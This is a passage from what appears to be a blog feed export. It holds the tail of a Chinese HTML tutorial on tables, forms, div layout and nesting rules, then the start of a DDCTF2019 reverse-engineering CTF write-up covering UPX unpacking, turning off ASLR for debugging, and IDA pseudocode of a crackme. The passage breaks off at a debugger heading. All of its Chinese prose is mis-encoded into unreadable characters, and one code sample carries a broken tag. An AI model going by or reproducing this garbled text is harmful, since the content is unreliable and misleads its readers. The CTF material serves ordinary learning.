class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>å°ç™½<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>å¥³<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>1w<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">colspan</span>=<span class="hljs-string">"2"</span>&gt;</span>å·¥èµ„åˆè®¡<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>2w<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></div><p><strong>æ•ˆæœï¼š</strong></p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/biaoge.jpg?raw=true" srcset="/img/loading.gif" alt></p><h2 id="HTML-è¡¨å•"><a href="#HTML-è¡¨å•" class="headerlink" title="HTML è¡¨å•"></a>HTML è¡¨å•</h2><p>è¡¨å•æ˜¯ä¸€ä¸ªåŒ…å«<strong>è¡¨å•å…ƒç´ </strong>çš„åŒºåŸŸã€‚è¡¨å•å…ƒç´ æ˜¯å…è®¸ç”¨æˆ·åœ¨è¡¨å•ä¸­è¾“å…¥å†…å®¹,æ¯”å¦‚ï¼šæ–‡æœ¬åŸŸ(textarea)ã€ä¸‹æ‹‰åˆ—è¡¨ã€å•é€‰æ¡†(radio-buttons)ã€å¤é€‰æ¡†(checkboxes)ç­‰ç­‰ã€‚</p><p>`<form><br>inputå…ƒç´ </form></p>\\\\\`<h4 id="HTML-è¡¨å•-è¾“å…¥å…ƒç´ "><a href="#HTML-è¡¨å•-è¾“å…¥å…ƒç´ " class="headerlink" title="HTML è¡¨å• - è¾“å…¥å…ƒç´ "></a>HTML è¡¨å• - è¾“å…¥å…ƒç´ </h4><p>è¾“å…¥æ ‡ç­¾<code>&lt;input&gt;</code>ã€‚</p><h4 id="æ–‡æœ¬åŸŸ"><a href="#æ–‡æœ¬åŸŸ" class="headerlink" title="æ–‡æœ¬åŸŸ"></a>æ–‡æœ¬åŸŸ</h4><p>æ–‡æœ¬åŸŸé€šè¿‡<code>&lt;input type=&quot;text&quot;&gt;</code> æ ‡ç­¾æ¥è®¾å®šï¼Œå½“ç”¨æˆ·è¦åœ¨è¡¨å•ä¸­é”®å…¥å­—æ¯ã€æ•°å­—ç­‰å†…å®¹æ—¶ï¼Œå°±ä¼šç”¨åˆ°æ–‡æœ¬åŸŸã€‚</p><p>`<form><br>First name: <input type="text" name="firstname"><br><br>Last name: <input type="text" name="lastname"></form></p>\\\\\`<p><strong>åœ¨å¤§å¤šæ•°æµè§ˆå™¨ä¸­ï¼Œæ–‡æœ¬åŸŸçš„ç¼ºçœå®½åº¦æ˜¯20ä¸ªå­—ç¬¦ã€‚</strong></p><h4 id="å¯†ç å­—æ®µ"><a href="#å¯†ç å­—æ®µ" class="headerlink" title="å¯†ç å­—æ®µ"></a>å¯†ç å­—æ®µ</h4><p><code>&lt;input type=&quot;password&quot;&gt;</code> æ¥å®šä¹‰</p><div class="hljs"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span>Password: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"password"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"pwd"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></code></pre></div><h4 id="å•é€‰æŒ‰é’®"><a href="#å•é€‰æŒ‰é’®" class="headerlink" title="å•é€‰æŒ‰é’®"></a>å•é€‰æŒ‰é’®</h4><p><code>&lt;input type=&quot;radio&quot;&gt;</code> æ ‡ç­¾å®šä¹‰äº†è¡¨å•å•é€‰æ¡†é€‰é¡¹ã€‚</p><div class="hljs"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"radio"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"sex"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"male"</span>&gt;</span>Male<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"radio"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"sex"</span><span class="hljs-attr">value</span>=<span class="hljs-string">"female"</span>&gt;</span>Female<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></code></pre></div><p><strong>Name æ˜¯å¯ä»¥è¿›è¡Œ==åˆ†ç»„==ã€‚æƒ³è¦æœ‰æ•ˆæœ valueä¹Ÿå°‘ä¸äº†ã€‚</strong></p><h4 id="å¤é€‰æ¡†"><a href="#å¤é€‰æ¡†" class="headerlink" title="å¤é€‰æ¡†"></a>å¤é€‰æ¡†</h4><p><code>&lt;input type=&quot;checkbox&quot;&gt;</code>å®šä¹‰äº†å¤é€‰æ¡†. ç”¨æˆ·éœ€è¦ä»è‹¥å¹²ç»™å®šçš„é€‰æ‹©ä¸­é€‰å–ä¸€ä¸ªæˆ–è‹¥å¹²é€‰é¡¹ã€‚</p><div class="hljs"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"checkbox"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"vehicle"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"Bike"</span>&gt;</span>I have a bike<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"checkbox"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"vehicle"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"Car"</span>&gt;</span>I have a car <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></code></pre></div><p><strong>ç±»ä¼¼å•é€‰ä¸‰è€…ç¼ºä¸€ä¸å¯ã€‚</strong></p><h4 id="æäº¤æŒ‰é’®"><a href="#æäº¤æŒ‰é’®" class="headerlink" title="æäº¤æŒ‰é’®"></a>æäº¤æŒ‰é’®</h4><p><code>&lt;input type=&quot;submit&quot;&gt;</code>å®šä¹‰äº†æäº¤æŒ‰é’®. </p><div class="hljs"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"input"</span> <span class="hljs-attr">action</span>=<span class="hljs-string">""</span> <span class="hljs-attr">method</span>=<span class="hljs-string">""</span>&gt;</span>Username: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"user"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"Submit"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></code></pre></div><p>==valueï¼šæäº¤æ•°æ®åˆ°æœåŠ¡å™¨çš„å€¼ï¼ˆåå°ç¨‹åºPHPä½¿ç”¨ï¼‰å†™æŒ‰é’®æ—¶ä¸€å®šè¦å†™ä¸Šã€‚   nameï¼šä¸ºæ§ä»¶å‘½åï¼Œä»¥å¤‡åå°ç¨‹åº ASPã€PHP ä½¿ç”¨==</p><h4 id="ç»ƒä¹ ï¼š-1"><a href="#ç»ƒä¹ ï¼š-1" class="headerlink" title="ç»ƒä¹ ï¼š"></a>ç»ƒä¹ ï¼š</h4><div class="hljs"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>è¡¨å•<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">""</span>&gt;</span> <span class="hljs-comment">&lt;!-- action ä¸­å€¼ä¸ºæäº¤çš„ç½‘é¡µ --&gt;</span><span class="hljs-comment">&lt;!-- é»˜è®¤ä¸ºget --&gt;</span>admin<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"user"</span>&gt;</span>password<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"password"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"password"</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"radio"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"sex1"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"male"</span>&gt;</span>ç”· <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"radio"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"sex1"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"female"</span>&gt;</span>å¥³  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"radio"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"sex"</span>&gt;</span>ä¸­æ€§<span class="hljs-comment">&lt;!-- nameä¸­å€¼ä¸€æ ·é‚£ä¹ˆå…¶åˆ†ç»„å°±ä¸€æ · --&gt;</span><span class="hljs-comment">&lt;!-- &lt;input type="radio" name="sex"&gt;ç”·&lt;input type="radio" name="sex"&gt;å¥³&lt;input type="radio" name="sex"&gt;ä¸­æ€§ --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-comment">&lt;!-- å…´è¶£å¤é€‰æ¡† --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"checkbox"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"xq"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"kanshu"</span>&gt;</span> çœ‹ä¹¦<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"checkbox"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"xq"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"xuexi"</span>&gt;</span>  å­¦ä¹ <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"checkbox"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"xq"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"music"</span>&gt;</span>  å¬æ­Œ<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>    åŸå¸‚<span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"city"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"shanghai"</span>&gt;</span>ä¸Šæµ·<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"beijing"</span>&gt;</span>åŒ—äº¬<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">""</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></div><p>æ•ˆæœï¼š</p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/biaodan.jpg?raw=true" srcset="/img/loading.gif" alt></p><h2 id="HTMLå¸ƒå±€"><a href="#HTMLå¸ƒå±€" class="headerlink" title="HTMLå¸ƒå±€"></a>HTMLå¸ƒå±€</h2><p><strong>HTML å¸ƒå±€ - ä½¿ç”¨<code>&lt;div&gt;</code> å…ƒç´ .</strong></p><p>å¯ä»¥å…ˆåˆ†ä¸ºå¤´éƒ¨div åº•éƒ¨div å’Œä¸­é—´çš„divï¼Œç„¶åé€æ­¥æ·»åŠ æ ‡ç­¾è¿›è¡Œæ‰©å……ï¼Œç”¨<strong>css</strong>æ¥è®¾ç½®æ ·å¼ã€‚</p><p>è¿™ä¸­é—´éœ€è¦ç”¨åˆ°floatï¼šleftç­‰ æ¥æ§åˆ¶ä¸€ä¸ªdivä¸­å¥—ç”¨çš„divçš„ä½ç½®ã€‚</p><ul><li>HTMLä¸­<code>&lt;div&gt;</code>å…ƒç´ æ˜¯å—çº§å…ƒç´ ï¼Œå®ƒå¯ç”¨äºç»„åˆå…¶ä»– HTMLå…ƒç´ çš„å®¹å™¨ã€‚</li><li><code>&lt;div&gt;</code> å…ƒç´ çš„å¦ä¸€ä¸ªå¸¸è§çš„ç”¨é€”æ˜¯æ–‡æ¡£å¸ƒå±€ã€‚<code>&lt;div&gt;</code>å…ƒç´ ç»å¸¸ä¸ <strong>CSS</strong> ä¸€èµ·ä½¿ç”¨ï¼Œç”¨æ¥å¸ƒå±€ç½‘é¡µã€‚</li><li><code>&lt;div&gt;</code> å…ƒç´ æ²¡æœ‰ç‰¹å®šçš„å«ä¹‰ã€‚</li></ul><p><strong>ç»ƒä¹ ï¼š</strong></p><div class="hljs"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>å¸ƒå±€<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-comment">&lt;!-- &lt;div style="background: yellow; width: 50px;"&gt;è¿™æ˜¯ä¸ªdivè¿™æ˜¯ä¸ªdivè¿™æ˜¯ä¸ªdivè¿™æ˜¯ä¸ªdiv&lt;/div&gt; --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"background: yellow;height: 100px;"</span>&gt;</span>å¯¼èˆª<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"background: green;width: 20%; float: left; height: 300px;"</span>&gt;</span>èœå•<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">di+v</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"background: red;width: 80%; float: left;height: 300px;"</span>&gt;</span>å†…å®¹<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></div><h2 id="HTMLåµŒå¥—è§„åˆ™"><a href="#HTMLåµŒå¥—è§„åˆ™" class="headerlink" title="HTMLåµŒå¥—è§„åˆ™"></a>HTMLåµŒå¥—è§„åˆ™</h2><h4 id="å…ƒç´ åˆ†ç±»ï¼š"><a href="#å…ƒç´ åˆ†ç±»ï¼š" class="headerlink" title="å…ƒç´ åˆ†ç±»ï¼š"></a>å…ƒç´ åˆ†ç±»ï¼š</h4><ul><li><strong>æ–‡å­—ç±»å—å…ƒç´ </strong>ï¼šp  h1~h6</li><li><strong>å®¹å™¨ç±»å—å…ƒç´ </strong>ï¼šdiv table tr td th form ul li ol dl dt dd</li><li><strong>è¡Œå…ƒç´ </strong>:ä¸ç‹¬ç«‹æˆè¡Œï¼Œä¸å¯ä»¥  å†…å®¹å†³å®ša img input strong em del span</li><li><strong>ç‰¹æ®Šå­—ç¬¦</strong>:br </li></ul><h4 id="è§„åˆ™"><a href="#è§„åˆ™" class="headerlink" title="è§„åˆ™"></a>è§„åˆ™</h4><ul><li>å—å…ƒç´ å¯ä»¥åµŒå¥—è¡Œå…ƒç´  <code>&lt;div&gt;è¿™æ˜¯div &lt;a href=&quot;&quot;&gt;è¿™æ˜¯a&lt;/a&gt; &lt;/div&gt;</code></li><li>è¡Œå…ƒç´ å¯ä»¥åµŒå¥—è¡Œå…ƒç´  <code>&lt;a href=&quot;&quot;&gt;è¿™æ˜¯ä¸ª&lt;strongã€‰ a&lt;/strong&gt;</code></li><li>è¡Œå…ƒç´ ä¸å¯ä»¥åµŒå¥—å—å…ƒç´ </li><li>æ–‡å­—ç±»æŠ‰å…ƒç´ ä¸å¯ä»¥åµŒå¥—å—å…ƒç´ </li><li>å®¹å™¨ç±»æŠ‰å…ƒç´ å¯ä»¥åµŒå¥—å—å…ƒç´ </li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>å­¦ä¹ è®°å½•</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DDCTF2019-RE-Windows Reverse</title>
    <link href="/2019/11/17/DDCTF2019-RE-Windows%20Reverse/"/>
    <url>/2019/11/17/DDCTF2019-RE-Windows%20Reverse/</url>
    
    <content type="html"><![CDATA[<h1 id="DDCTF2019-RE-Windows-Reverse"><a href="#DDCTF2019-RE-Windows-Reverse" class="headerlink" title="DDCTF2019-RE-Windows Reverse"></a>DDCTF2019-RE-Windows Reverse</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åœ¨ä¸€ä¸ªè®ºå›é‡Œå‘ç°DDCTFè¿™ä¸¤é“é€†å‘é¢˜ä¸æ˜¯å¾ˆéš¾ï¼Œå°±æƒ³ç€åšä¸€ä¸‹ç»ƒç»ƒæ‰‹ã€‚å› ä¸ºæœ€è¿‘åšçš„éƒ½æ˜¯æ¯”è¾ƒè€çš„é¢˜ç›®ï¼Œè¿™ä¸ªè¿˜ç®—æ–°ä¸€ç‚¹çš„ã€‚é¢˜ç›®ä¸‹è½½ï¼š<br><a href="https://raw.githubusercontent.com/chumen77/chumen77.github.io/master/2019/11/17/DDCTF2019-RE-Windows Reverse/reverse1_final.zip" target="_blank">reverse1_final.zip</a><br><a href="https://raw.githubusercontent.com/chumen77/chumen77.github.io/master/2019/11/17/DDCTF2019-RE-Windows Reverse/reverse2_final.exe.zip" target="_blank">reverse2_final.exe.zip</a></p><h2 id="reverse1-final-exe"><a href="#reverse1-final-exe" class="headerlink" title="reverse1_final.exe"></a>reverse1_final.exe</h2><h3 id="æŸ¥å£³"><a href="#æŸ¥å£³" class="headerlink" title="æŸ¥å£³"></a>æŸ¥å£³</h3><p><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739838372961.jpg" srcset="/img/loading.gif" alt="-w539"><br>å¯ä»¥çœ‹å‡ºæ˜¯UPXå£³ã€‚<br>å¦å¤–ï¼š</p><div class="hljs"><pre><code> /Volumes/data/ctfé€†å‘é¢˜ç›®/2019ddctf î‚° file reverse1_final.exereverse1_final.exe: PE32 executable (console) Intel 80386, for MS Windows, UPX compressed</code></pre></div><p>åœ¨macç»ˆç«¯ä¹Ÿå¯ä»¥ç”¨fileå‘½ä»¤æŸ¥å‡ºã€‚</p><h3 id="è„±å£³"><a href="#è„±å£³" class="headerlink" title="è„±å£³"></a>è„±å£³</h3><p>ç›´æ¥åœ¨ç»ˆç«¯UPX -d è„±äº†å°±å¯ä»¥äº†ã€‚</p><h3 id="è¿è¡Œ"><a href="#è¿è¡Œ" class="headerlink" title="è¿è¡Œ"></a>è¿è¡Œ</h3><p>å‘ç°ç›´æ¥æ˜¯è¿è¡Œä¸äº†çš„ï¼Œæƒ³åˆ°æ˜¯ä¸æ˜¯å› ä¸ºè„±å£³åè¿™ä¸ªéœ€è¦èµ„æºä¿®å¤ï¼Œå„ç§æ“ä½œä¿®å¤åå‘ç°è¿˜æ˜¯ä¸å¯ä»¥ã€‚æœ€åæŸ¥è¯¢ä»–äººwpå‘ç°è¿™ä¸ªç¨‹åºå¼€å¯äº†<strong>ASLR</strong>ã€‚éœ€è¦peå·¥å…·å»å…³é—­è¿™ä¸ªç¨‹åºçš„ASLRã€‚ç„¶åæˆ‘å°±å»æŸ¥äº†ASLRæ˜¯æ€ä¹ˆå…³é—­çš„ï¼Œä¸”å…¶æ˜¯ä»€ä¹ˆä¸œè¥¿ã€‚</p><h4 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h4><p>ASLRé€šè¿‡éšæœºæ”¾ç½®è¿›ç¨‹å…³é”®æ•°æ®åŒºåŸŸçš„åœ°å€ç©ºé—´æ¥é˜²æ­¢æ”»å‡»è€…èƒ½å¯é åœ°è·³è½¬åˆ°å†…å­˜çš„ç‰¹å®šä½ç½®æ¥åˆ©ç”¨å‡½æ•°ã€‚ç°ä»£æ“ä½œç³»ç»Ÿä¸€èˆ¬éƒ½åŠ è®¾è¿™ä¸€æœºåˆ¶ï¼Œä»¥é˜²èŒƒæ¶æ„ç¨‹åºå¯¹å·²çŸ¥åœ°å€è¿›è¡ŒReturn-to-libcæ”»å‡»ã€‚ â€“ç™¾åº¦ç™¾ç§‘<br>éšååˆæŸ¥è¯¢åˆ°win7ä»¥åçš„windowsç³»ç»Ÿéƒ½æ˜¯æœ‰è¿™ä¸ªæœºåˆ¶çš„ï¼Œ<strong>ä½†å› ä¸ºæœ‰å®ƒçš„å­˜åœ¨æ¯æ¬¡odè½½å…¥æ—¶ï¼Œå…¶æ˜ åƒåŸºå€éƒ½æ˜¯ä¼šå˜åŒ–çš„ï¼Œè€Œä½ æœ‰æ—¶å€™éœ€è¦è®¡ç®—ä¸€äº›åœ°å€ï¼ŒåŸºå€è€æ˜¯å˜</strong>ã€‚ä»¥å‰æˆ‘æ˜¯ä¸çŸ¥é“è¿™ä¸ªçš„ï¼ŒçŸ¥é“ä»¥åæ„Ÿè§‰è¿™ä¸ªæ˜¯æ›´åŠ åˆ©äºå¯¹ç¨‹åºçš„åˆ†æï¼Œå°±æƒ³ç€ç›´æ¥å…³é—­windows7çš„ASLRã€‚</p><h4 id="å…³é—­ASLR"><a href="#å…³é—­ASLR" class="headerlink" title="å…³é—­ASLR"></a>å…³é—­ASLR</h4><p>æœ‰ä¸¤ç§åŠæ³•ã€‚</p><h5 id="æ”¹æ³¨å†Œè¡¨"><a href="#æ”¹æ³¨å†Œè¡¨" class="headerlink" title="æ”¹æ³¨å†Œè¡¨"></a>æ”¹æ³¨å†Œè¡¨</h5><p><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739848952944.jpg" srcset="/img/loading.gif" alt="-w901"><br>æ³¨å†Œè¡¨æ·»åŠ äº†ä¸€ä¸ªDWORDé”®å€¼é¡¹ï¼Œå…¶å€¼ä¸º0ã€‚æ³¨æ„å…¶åç§°å’Œè·¯å¾„ã€‚</p><h5 id="è½¯ä»¶å…³é—­"><a href="#è½¯ä»¶å…³é—­" class="headerlink" title="è½¯ä»¶å…³é—­"></a>è½¯ä»¶å…³é—­</h5><p>ä¸‹è½½EMETï¼š<a href="https://www.updatestar.com/directdownload/emet/2258274" target="_blank" rel="noopener">https://www.updatestar.com/directdownload/emet/2258274</a><br><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739850550859.jpg" srcset="/img/loading.gif" alt="-w730"><br>å…³é—­åé‡å¯å³å¯ã€‚</p><h4 id="æˆåŠŸè¿è¡Œ"><a href="#æˆåŠŸè¿è¡Œ" class="headerlink" title="æˆåŠŸè¿è¡Œ"></a>æˆåŠŸè¿è¡Œ</h4><p>ç¨‹åºæˆåŠŸè¿è¡Œåå‘ç°ï¼š<br><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739851761277.jpg" srcset="/img/loading.gif" alt="-w499"><br>è¿™ä¸ªä¼°è®¡åˆæ˜¯å­—ç¬¦å¯¹æ¯”ã€‚ç”¨IDAæ‰“å¼€åˆ†æå…¶é€»è¾‘ã€‚</p><h3 id="IDAé™æ€åˆ†æ"><a href="#IDAé™æ€åˆ†æ" class="headerlink" title="IDAé™æ€åˆ†æ"></a>IDAé™æ€åˆ†æ</h3><h4 id="ä¸»å‡½æ•°"><a href="#ä¸»å‡½æ•°" class="headerlink" title="ä¸»å‡½æ•°"></a>ä¸»å‡½æ•°</h4><div class="hljs"><pre><code>int __cdecl main(int argc, const char **argv, const char **envp){  char v4; // [esp+4h] [ebp-804h]  char v5; // [esp+5h] [ebp-803h]  char v6; // [esp+404h] [ebp-404h]  char Dst; // [esp+405h] [ebp-403h]  v6 = 0;  memset(&amp;Dst, 0, 0x3FFu);  v4 = 0;  memset(&amp;v5, 0, 0x3FFu);  printf(&quot;please input code:&quot;);  scanf(&quot;%s&quot;, &amp;v6);  sub_401000(&amp;v6);  if ( !strcmp(&amp;v4, &quot;DDCTF{reverseME}&quot;) )    printf(&quot;You&apos;ve got it!!%s\n&quot;, &amp;v4);  else    printf(&quot;Try again later.\n&quot;);  return 0;}</code></pre></div><p>ä»£ç å¾ˆç®€å•ï¼Œå¯ä»¥çœ‹å‡ºæ¥æ˜¯åœ¨æ¥å—è¾“å…¥åï¼Œç»è¿‡sub_401000å‡½æ•°åˆ†å¤„ç†åä¸DDCTF{reverseME}å¯¹æ¯”ï¼Œæ­£ç¡®å°±è¾“å‡ºYouâ€™ve got it!ã€‚</p><h4 id="å¤„ç†å‡½æ•°sub-401000"><a href="#å¤„ç†å‡½æ•°sub-401000" class="headerlink" title="å¤„ç†å‡½æ•°sub_401000"></a>å¤„ç†å‡½æ•°sub_401000</h4><div class="hljs"><pre><code>unsigned int __cdecl sub_401000(const char *a1){  _BYTE *v1; // ecx  unsigned int i; // edi  unsigned int result; // eax  const char *v4; // ebx  i = 0;  result = strlen(a1);  if ( result )  {    v4 = (a1 - v1);    do    {      *v1 = byte_402FF8[v1[v4]];      ++i;      ++v1;      result = strlen(a1);    }    while ( i &lt; result );  }  return result;}</code></pre></div><p>å¯ä»¥çœ‹å‡ºæ¥è¾“å…¥çš„ä¸œè¥¿çš„ç¡®åœ¨è¿™é‡Œè¿›è¡Œäº†ï¼Œä¸€ä½ä½çš„å¤„ç†ã€‚<br><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739858421447.jpg" srcset="/img/loading.gif" alt="-w521"><br>ç”¨è¿™é‡Œçš„å­—ç¬¦ä¸²è¿›è¡Œäº†æ›¿æ¢ã€‚<br><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739858895484.jpg" srcset="/img/loading.gif" alt="-w917"><br>ä½†æ˜¯è·³è½¬æŸ¥çœ‹å‘ç°æ²¡ä»€ä¹ˆä¸œè¥¿ï¼Œå‘ç°æœ€ä¸‹æ–¹ä¸€æ®µä¸çŸ¥é“æœ‰ä»€ä¹ˆç”¨çš„å­—ç¬¦ä¸²ã€‚é™æ€åˆ†æè‡³æ­¤ï¼Œæ²¡ä»€ä¹ˆæ€è·¯äº†ã€‚ç”¨odæ¥çœ‹çœ‹æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²ä¼šå˜æˆä»€ä¹ˆæ ·ã€‚</p><h3 id="ODåŠ¨æ€åˆ†æ"><a href="#ODåŠ¨æ€åˆ†æ" class="headerlink" 